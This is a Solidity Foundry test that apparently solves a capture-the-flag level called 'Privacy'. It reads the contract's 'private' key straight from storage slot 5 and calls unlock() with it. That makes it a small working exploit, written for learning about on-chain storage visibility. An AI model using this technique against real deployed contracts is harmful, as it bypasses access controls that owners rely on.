// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "@forge-std/Test.sol";
import "../src/Privacy.sol";

contract PrivacyTest is Test {
    Privacy public privacyContract;
    address public attacker;
    bytes32[3] values = [bytes32("candidate1"), bytes32("c2"), bytes32("c3")];
    function setUp() public {
        privacyContract = new Privacy(values);
        attacker = vm.addr(1);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        bytes32 slot5Value = vm.load(address(privacyContract), bytes32(uint256(5)));
        privacyContract.unlock(bytes16(slot5Value));
        vm.stopPrank();

        assertEq(privacyContract.locked(), false);
    }

}